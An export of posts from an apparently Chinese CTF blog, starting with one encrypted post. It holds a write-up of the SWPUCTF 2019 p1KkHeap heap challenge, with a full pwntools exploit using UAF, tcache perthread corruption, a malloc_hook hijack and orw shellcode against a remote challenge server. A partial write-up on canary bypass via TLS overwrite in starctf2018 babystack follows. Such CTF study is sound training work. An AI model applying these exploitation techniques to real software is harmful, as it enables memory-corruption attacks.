4fdf6a116fb2c04f044701668397a39f1b51e917e66cd9c3bda8f39f969f2bee460608deb419c949e60c2aa1a68fd342c7274c71c955b8f02f6591b4c15b94fd4d2ea955e2a7b8c74c9c7833e752656d43b5c2506da9c28a4cbed2dcdbe67c604b3f12078c675adf1387e8088346fa9f180c11a701bd96a80de5aeab52090363806c614be7cb28a3503ebe6c8d98c381caa317bcfdc46edaf166c907194522cb292ec1ba34653880fc754acd6333934da39609d19ffb7b2861df9370f7d5f2542d18c18384e17149720e04e2b5926ebd4febd9c6221f18448f94755dba7a699dfba34da46cb69b587c458f037abc4060b5695fd1266dc0e161ad8e264076337bddfdf311fd1abe3e768a1ab7a466690dc760019b4b816003fca095803c7951e3e009aa41a36cb2cb8b4634d5dd094a03c60ba10d8163370b666037287c9430371ecb2a5d906a3f3d509caaa881b383435eada673d7d5d2deba3e9b06a58a74645583c903e3aa07dceecf1330938c6057bb13da91c5346a238db862d9f05f4933918e6107e6fa3944059fd8af77646cf286010dd27c747f33a4c918032d7846e682c0392631c24a71348f4ffb92dd18abcd19d6b281157cf4325b42272fadbebc0a8edfe2216b16230743c67ba371cbdca338d756daeba8aee3c29d18602aaaa1db095e28ef05d3ba6cbd208c9119bc6839abb2d1cfe6e31050f1cb6fae408d44504b11e30ee3393183e904c1f1ac324ce9436ce2d630858f616f515fff5bc81de6922cb2d4ae4766d691aff59cf4348be3165668053c16889be0c5304ebdc780b307201058530a944adc60755cc8c15e6cad9744eb95967c0082d12cc580a92053d6cab5ad5add238ded599d1768550e20a99460bbf61eea520376b80d698e5d26a8f3f0753a7a05ca0908a40270f36ba80c8c0948fd6981335abed85cd87ce211f224cecf97c83f707721f44e4b6fef16d4f1ff0a1dd1f07c70538abf0dc3b2e23cd35db7348f9a4ab93e2f9c5d9b7c98a5ce8d6aab85e6660640f174d2ef7ab3dfb9e97d628c6ba51ce3fea0defb9b6af9b89e893ea2da22403e5fb7b6f6e57f70c035ce808fea285913dc1be15cbb9b05dc41bc82fa557fcd157a2739f3bca9243cea2e793b45cd53edd93540591d6216656d225ac00c59d2de193e9e522c4de00d3fe677ff040dc87da9ab8513d719b41dc9f07a87108fdea6e4b767dee8ef9a71f190731537ab6191d4f7539e1aa4ca02a86d440a0fc1ef165850f76526f9f0655a1aa028987c4cbf750b165972a08754a7562db96c1ef7a71ccbf4b3a55dda5795d0a4934e44c2c2a064f62434ea508f27270017a4776b13bf842ff475d83c7e0b1a2f2d8c40c72cc8ef35ad9bc68fd5596df6330ecefd99844234600f1fa31500672b0bff11ea70546b61e5af53cead4e9f16b46e9e7b5891418af00aa514dffe205313c095a13252738f739589570d3b843f9b504590f6673489793b38abafb6f4e1b717610df2b9e06e7da120d840d9a0999143a7ea87e6b8d9adc2993cb9359940c803bab83c2b407220f53ebb754f8c98b7344ee8fe86f7e2d28b97d97a576162b6442f35918f88dff1ea90425760fff08a81787e9596b74178839d65c05c6ffafa0e671af4e67f3420d63c2f384b645e05a28284bc3175464d5a22539412bacb936f43f6774b98ee750296bebce5f2ecc9bd7022be9d4a6072f5a8ea623eb452e6241cfba47ec8f4cdb3862c75c532b6a2d868ea62d61a26228c864fb13dd8472cde69915eceb7f5e9f99799a4e90963657a1489d20e62c0b1b780be24c105729b5f5c9e867b3b4e6bf6508d68d8917e9701ca5e22175f47789606a0adc8524f299d26eaa0acbeea06329babe98203a4625da772ae384135e5b45514331598f37683a138f84337029725f06a4d00ee40aa51e552b31e595fdab690982f098e8c683842ae5fe2279cc400a12f64128294ea3e64b651d4f10e0d06bd6d364f39fe2dc8d04c26dfc7698a151474f0c0e5e1bc29598b867b32def153fd1a9ab9483f081cffa344e7bf38836d929cd78378c555a0af5dbb26ca2060531ff35f13c268412d887a76a616a019708fccb75a5d60e3e5680b4edea7e31edcda2448e86f1d1a64265829514c46b323e3ea5a54ebaa3e5babc9c685be1b34bc4aa6855eb80356886b4389c0cad6b8c9e3676e44e46d919976af651cd8c9a7067d629f766ac2eab19568d80b82cc6372be77a18764b5936f0f67d3f7df80efa30e57e4d63827c704309b29c4ab7665797eee77e929b21d17f58d1d9f14892ab2b98956eeebce26e7eae9433eb68ff748ddd39b1cdd48d63ac469690bfa14e09721def7e7c85d578b24c84828abc32a452a4ba4e70c2331d936e70f8e3ca8ccb38e82ce015a2c25d4221a22045dc508c2a47d217c8e8047ed211fe71d72123e353ad8d056840430543d71072638e97224277a2069f3b3514810902c79bae746a4cb1fef56cba3f42258ded07de7af751678899c209a4a0c2f6a8f3e0ad94825c43062a70cf632d6c37fea8728b79867a1544fee90c936d0e8c9889f169371078431199514c05c8128e218eab563b9f899b105d139b32ef33697d637030416427da2d1a9cc896dafdd240d6d3acb5dc1f2673129bc6c3d9cd0423fbe62f55f11f82facbde6a78bf407d15689b5755e04375a9eb33e85654aec69c3c207aec532adcac96585e87bb9be3be46ae49803da310b8b6b12fc4aa288712da4ac68b331b95bc32c484c016ed795f7f65a59aad9bdde2b8561e0455f8492c2499496fedec84f7552a475523e578b3b7aae663345da28803fc8ec6ac3f5fd190a74d062a0a2b1effc808bbdc9fa41c26db8befb2712a730aa2cbedbeaef6073bd2f6335236a43f3d5897ed5d859c3a3a2178b27dd116131f3849a117160f1cfba2d26edf6064234e9e659fa5641754c42076870c1230a261955323c14a0a9bb6385a68e46ba1f347d05c5aa011b183b4f684b545fa24688897cfc444aab3fb9d94774721e7a331ff97ad5e3c7f6d79f20a8f9cd51c7fe3c52def5241983f7197f2c0e55f165914186808ac0de7a42d6839184c54de8046f0635be8b67c183609daf8ff2703ee1e78dbd86e53c93b9b2b91a04d8c0db61db43b71e909f8d6c35eef0e0941b4d58c4aeaaf182b2d609318352a82314724b3ca01da8a6174fdc3c7d7c8e9e55b2922ca7d4e191dcb2336336b72bcdbfd8b0817afda7e5501485fc4c2ec6f02c59bd8d56011fd9e0385eb41ed410cb7d07ddeef13571c5a42601ed53b7d201409db89d496b1ccdcc7f42b0e0194589cb7d8d058f3000790819690b6c7e2c02b770fa385753528336fbd2869f433fa87f63e3ba19c29b591c618dacf81618776b4707a39323fc89cb333332e305f2c5b40f1b17a22f2b8afe0e6f6ad5b159fe04c0d89fe5ad1ccbb7e626751e7b7daaa87ce6fa48df9eb381d22adbd39ba096b1c3040adecbe715dc64995b78219886a6725e0adce4982379b3f7cf61c982be05479850426b86f935cbe892d4593ff7a1981d3fc3ac71056b02e3402c48173dc5cdab3e0d158be1c671ec11991829033bcc16af21e302479d372026f4627330ccd53c91031bc1fdd38cf0bb805129c96d596a82a563b04209d0d4cbc652be482b2b7b4532a052d08104252ad95f6e4e65f9e3cdb157cfdc2a9c4348a6092f48a03c25bd71c5466329e4703efe82f261e862b40736066b997efea1b5acc7207684da5da461ccf7e21344999b9b02a1875491836eb9962a1c1be81959e0ef98fd0538a3a036b5db09a6f01543a4f6b4008fae2cfda0b7e87b90bc78c2381f0f0e697c6c11d9adbf0a14b0e084d409b55484956d8c46dad06c0d83eefc023954bb0881ff335142a7d788021012158d8f64d1a69dd9899ffc6e450772ad52901ee8539c905c9156cc3874beaa439e833ab02ad12ba5447d36a5a0cf0e3d31c7547f3d187ac36a144ce7b77c398ec235b005d9fc4d4e181b4a4eab1fd97fe993573988110b5235aed8b6a605fed162645caa89afc910c967e7e64fc8cc30c1f68ec431634041e09d1c362804d70f06da689194f29b70663544bebd9fb7516722542b79a9d9cd521de63ffa905a0b1906249b872f3e8d3f242201f42a447aecdd4cf70cc391ba23e3234815f9289f2b7ea7fd2754dbc3ef34e104060959b5571200e00167c92a69229a8af5e5dfb8ae99e9d44aaa9c0d97fb6a71dbe5505fda989e1a23302a695690f2bb1a4b71ed4d6cc426cef6f2c2c0909514ef0e9ff3593d31a176fe59cfa45a59d25eb86decf335e253b9a319047a232822974af233da9d233710c1d9fc40e0fb37a0bbdf1cddb10a7737bf692acabd5af56812ccdb23f4529556a175ae18dde1cde874bee51b93b974931e6f6afe66228a40ac5f0965d3ee1e48eab6d4791dad92f0a5e6cf2ad918c92b6c2aedde0156b8756ace6493bebd6a7a648b34dee79d7e93f4fa575eb44c88fee7ce8db70ce829de47716ef49fc8d912c10369575841693fb169d62bc3bd85a89918535b98f1d7b481e8d6615a9e4b21474d03cac618d8644265ae132347a84d52530c2d34af7f3d3e5d038795bcebff6748097fcf2962cfc2d130d46284f594a3be2fe0882ebeaabb187f4a1cbcacec5d1102292ea982b985072b3a66be9bd8c891838f37a937be591d874c63c3da8cc133981558db32a4cf9feafd0cfc10242e3abdab69c238b121018ffa9335a26cdecb902a52e3fb1e1263a1df1394a2afcfc09327429af409aa2990a76d6f87a24a94d319666d9993b6b328647c60715c9c6aaf0142e09b9aaad872c4d2c001ae52c77675d03f8d1d14d0610e3c7aaf1796cc4122468ccf0e0c1e03cc86c47d3cad09b44b27849c60b4f53379d2f38e39bec4e7964f0d26b7c66564b55d4</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>私房菜</category>
      </categories>
      <tags>
        <tag>篡改got表</tag>
        <tag>UAF</tag>
        <tag>lab</tag>
      </tags>
  </entry>
  <entry>
    <title>SWPUCTF_2019_p1KkHeap</title>
    <url>/posts/a25249b0.html</url>
    <content><![CDATA[<h2 id="总结-amp-amp-启发："><a href="#总结-amp-amp-启发：" class="headerlink" title="总结&amp;&amp;启发："></a>总结&amp;&amp;启发：</h2><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>通过这道对于tcache机制有了一定的认识。</p>
<p>tcache_perthread_struct结构体是用来管理tcache链表的，它的源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS		64</span></span><br></pre></td></tr></table></figure>

<p>这个结构体中有两个成员变量，一个是64字节的counts数组。该数组的每个元素都各自对应了64个tcache链表其中一条上chunk的数量(最大为7)。另一个成员变量是一个结构体指针数组，该数组的大小为64*8字节，该数组存放的是每条tcache链表的头指针。</p>
<span id="more"></span>

<p>而这个结构体会在第一次用户分配堆内存空间之前，会被申请出来。其大小为0x10+0x40+0x40*8&#x3D;0x250。</p>
<p>如果我们能将这个tcache_perthread_struct结构体申请出来并进行编辑，那就可以达到任意地址申请(直接凭空在结构体指针数组中写入任意地址)，又或者我们篡改count的值，让原本一个堆地址对应的count是1，我们将其修改为7，这样再次将其释放掉，就可以让它进入unsorted bin中了。</p>
<h3 id="启发："><a href="#启发：" class="headerlink" title="启发："></a>启发：</h3><blockquote>
<p>通过这道题，也让我受到了一些启发，本题是可以泄露出堆地址，从而将tcache_perthread_struct申请出来，但是我发现这里可以利用UAF打一个tcache dup，然后爆破一比特位，也可以将tcache_perthread_struct申请出来。然后对其进行编辑，从而达到任意地址申请，又或者更改tcache链表的counts。最后打io_leak，也可以泄露出libc地址，而这样就不需要存在泄露函数了。通过查阅资料，发现这位师傅在2019年就提出了这种攻击</p>
<p><a href="https://xz.aliyun.com/t/6828#toc-0">初探tcache struct攻击 - 先知社区 (aliyun.com)</a></p>
</blockquote>
<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="/../img/2706180-20220828154000077-1408719411.png"></p>
<p>可以看到保护全开，并且开了沙箱禁用了execve，那就考虑orw。</p>
<h2 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h2><h3 id="delete函数："><a href="#delete函数：" class="headerlink" title="delete函数："></a>delete函数：</h3><p>通过分析下面的delete函数，发现该函数存在UAF漏洞，但是free指定堆块后，会把该堆块的size位给置空。且该函数只能执行三次。</p>
<p><img src="/../img/2706180-20220828154022952-102798994.png"></p>
<h3 id="add函数："><a href="#add函数：" class="headerlink" title="add函数："></a>add函数：</h3><p>通过分析add函数中(如下图)，发现我们最大只能申请0x100的堆块，并且因为free掉堆块后并不会被置空指针再根据add函数这边的限制，所以add函数只能执行8次。</p>
<p><img src="/../img/2706180-20220828154036282-188410497.png"></p>
<h3 id="edit函数："><a href="#edit函数：" class="headerlink" title="edit函数："></a>edit函数：</h3><p>因为edit函数中的read是根据存储在bss段上的size来决定输入的字节数的。而delete函数后会将size置空，这里要注意一下。</p>
<p><img src="/../img/2706180-20220828154050622-1112821718.png"></p>
<h3 id="show函数："><a href="#show函数：" class="headerlink" title="show函数："></a>show函数：</h3><p>这就是个常规的show函数，打印堆块里的数据。</p>
<p><img src="/../img/2706180-20220828154116200-1979509908.png"></p>
<h3 id="init函数："><a href="#init函数：" class="headerlink" title="init函数："></a>init函数：</h3><p>初始化函数中不仅开了沙箱，还映射到0x66660000了一段可读可写可执行的内存。</p>
<p><img src="/../img/2706180-20220828154127411-1367182171.png"></p>
<h2 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h2><h3 id="泄露堆地址，做一个tcache-dup"><a href="#泄露堆地址，做一个tcache-dup" class="headerlink" title="泄露堆地址，做一个tcache dup"></a>泄露堆地址，做一个tcache dup</h3><p>因为是2.27的libc，存在UAF我们就可以直接打tcache dup。因为沙箱禁用了execve，所以我们采用orw，将orw的shellcode写在0x66660000，最后将0x66660000这个地址写到malloc_hook即可。</p>
<p>这题的问题就是虽然存在show函数，但是我们add函数执行的次数有限，同时无法申请大于0x100的堆块。因此正常情况下我们的堆块被释放后进不去unsorted bin中，也就是拿不到libc地址(但是我们可以拿到堆地址)。而且delete函数的次数有限，我们不能无限制的利用tcache dup。</p>
<p>因此这道题采用的攻击手法为tcache perthread corruption</p>
<p>首先我们先利用UAF配合show函数泄露下堆地址，接着做一个tcache dup。此时的效果如下：</p>
<p><img src="/../img/2706180-20220828154144232-1994127415.png"></p>
<p>此时的exp为：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h3 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h3><p>由于我们有了堆地址，那我们就打一个tcache poisoning将tcache_perthread_structshe申请出来，然后我们来将0x66660000这个地址伪造为一个tcache的链表头（顺便修改下对应count），这样malloc对应的字节就能把0x66660000这个地址给申请出来了，顺便再将有double free的那条tcache链的count改成7，这样再delete一次，堆块就可以进入unsorted bin中了。</p>
<p>这步的exp如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(target_addr))</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x251</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0700000000000001</span>)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0x66660000</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(heap_addr))</span><br></pre></td></tr></table></figure>

<p>此时的bins情况如下图：</p>
<p><img src="/../img/2706180-20220828154202844-733207592.png"></p>
<h3 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h3><p>接着我们将0x66660000给申请出来写入orw的shellcode。再释放掉一次位于counts为7那条tcache链的堆块(在这之前先申请一个小堆块，来防止该堆块释放后与top chunk合并)，这样该堆块就进入了unsorted bin中。然后执行show函数，我们就拿到了libc地址。</p>
<p>效果如下：</p>
<p><img src="/../img/2706180-20220828154218617-1109639937.png"></p>
<p>这部分的exp为：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">4</span>,shellcode_store(<span class="string">&#x27;orw_64&#x27;</span>))</span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#prevent chunk</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">leak_libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3ebca0</span></span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="tcache-perthread-corruption，劫持malloc-hook"><a href="#tcache-perthread-corruption，劫持malloc-hook" class="headerlink" title="tcache perthread corruption，劫持malloc_hook"></a>tcache perthread corruption，劫持malloc_hook</h3><p>此时我们拿到了libc地址，如果常规方法打tcache poisoning的话，先edit修改下tcachebin中的fd指针，然后需要add两次才能将malloc_hook申请出来，然后修改了malloc_hook后，还需要最后再add一次才能触发shellcode，但事实上这道题我们只能执行add函数8次，而上述所有操作用到了9次add函数，因此这个方法不行。所以我们采用的策略是再编辑一次tcache_perthread_struct结构体，直接伪造出malloc_hook的地址在tcache bin中，因为malloc_hook被伪造到了链表头的位置，所以我们只需要一次add函数就能将其申请出来了，最后编辑malloc_hook写入0x66660000这个地址，我们再次执行add函数时，就可以执行我们的shellcode将flag读出来了。</p>
<p>下图是将malloc_hook写到tcache链表头的位置。</p>
<p><img src="/../img/2706180-20220828154235337-35519013.png"></p>
<p>这部分exp为：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x251</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0700000000000001</span>)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(malloc_hook))</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_d,d_a,d_s,d_e,<span class="number">0xf44</span>)</span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0x66660000</span>))</span><br><span class="line">add(<span class="number">0x40</span>)</span><br></pre></td></tr></table></figure>



<p>最终的exp如下：</p>
<p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27132</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0x11b7</span></span><br><span class="line">d_a=<span class="number">0x1193</span></span><br><span class="line">d_e=<span class="number">0x11ab</span></span><br><span class="line">d_s=<span class="number">0x119f</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your Choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your Choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;id: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your Choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;id: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your Choice: &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;id: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))    </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line">target_addr=heap_addr-<span class="number">0x260</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(target_addr))</span><br><span class="line"><span class="comment"># edit(1,p64(0x66660000))</span></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">  </span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x251</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0700000000000001</span>)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0x66660000</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(heap_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">4</span>,shellcode_store(<span class="string">&#x27;orw_64&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#prevent chunk</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">leak_libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3ebca0</span></span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x251</span>)+p64(<span class="number">0x0000000000000000</span>)+p64(<span class="number">0x0700000000000001</span>)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(malloc_hook))</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a,d_s,d_e,0xf44)</span></span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0x66660000</span>))</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220828154253204-1927856405.png"></p>
]]></content>
      <categories>
        <category>buu刷题</category>
      </categories>
  </entry>
  <entry>
    <title>starctf2018_babystack</title>
    <url>/posts/6967ee12.html</url>
    <content><![CDATA[<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过本题的学习与总结有：</p>
<ol>
<li><p>之前一直以为ret2libc必须得返回到原本的输入函数处，再次输入一次getshell。但有时候我们重新返回到原本的输入函数可能会出现一些问题，因此我们可以打一个栈迁移+rop执行read。就是先覆盖rbp为bss段上的地址，然后执行puts函数泄露libc，接着执行read函数往bss段上输入数据，最后执行leave ret完成栈迁移从而将执行流劫持到bss段上</p>
</li>
<li><p>插入到栈里的canary是从TLS结构体中的stack_guard成员变量赋值过来的(而函数返回时，会将栈里的canary与TLS中的stack_guard做对比)。主线程中的TLS通常位于mmap映射出来的地址空间里，而位置也比较随机，覆盖的可能性不大；子线程中的TLS则位于线程栈的顶部(高地址处)，而这个子线程栈通常也是mmap映射出来的一段内存，这就给了我们栈溢出控制子线程中的TLS机会</p>
</li>
<li><p>TLS(Thread Local Storage) 线程局部存储。本身是一种机制，简单来说就是多个线程访问同一个全局变量或者静态变量可能会发生冲突，而这个机制类似于让每个线程都备份了一份全局变量或者静态变量，当前线程只能修改自己这份全局变量或者静态变量并不会影响其他线程的全局变量以及静态变量。</p>
</li>
<li><p>在glibc实现中，TLS被指向一个segment register fs(x86-64上)，它的结构tcbhead_t定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">               thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;</span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure>

<p>而上面的stack_guard也就是放到栈里的canary，而在程序里看见的这行代码</p>
<p><code>xor rdx, fs:28h</code>中的fs寄存器也就指向了TLS这个结构体，而偏移0x28的位置正好是stack_guard,canary是来自于内核生成的一个随机数。</p>
</li>
<li><p>最后要说一下这个子线程栈和父线程内存的关系。每个线程都会有自己单独的栈区，而子线程的栈区通常都是调用了mmap映射了一段内存。在父进程里我们依然可以看到这片内存<span id="more"></span>，如下</p>
</li>
</ol>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211272219862.png" alt="image-20221127221900131"></p>
<p>在父线程中依然可以看到这片内存，并且发现是mmap映射出来的区域，如下，所以子线程的栈区只是对于自己是私有的，这并不意味着其他线程访问不了，如果能拿到相关指针，依然可以对其操作。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211272220056.png" alt="image-20221127222016217"></p>
<h2 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h2><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211272224223.png" alt="image-20221127222402146"></p>
<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>主函数就是开了一个子线程出来，然后子线程去执行了这个函数</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211272227552.png" alt="image-20221127222751474" style="zoom:50%;" />

<p>而在子线程调用的这个函数，漏洞是很明显的栈溢出(如下)。特点是溢出的字节数很大。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211272228512.png" alt="image-20221127222845444" style="zoom:50%;" />

<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>本程序是在子线程里有一个很大的栈溢出漏洞，而子线程的栈是mmap映射出来的内存，并且TLS位于栈的顶部(高地址)，这道题的关键就是绕过canary保护。因为最后canary会和fs:0x28的值去比较，而fs就是TLS的首地址，0x28的位置就是stack_guard(canary就是拷贝的这个值放到的栈里)。因此我们在子线程里栈溢出去控制TLS里的stack_guard，让其和canary的值一样即可。</p>
<p><strong>如果想要在gdb中获取子线程TLS的首地址可以执行<code>x/x pthread_self()</code>来查看</strong>。</p>
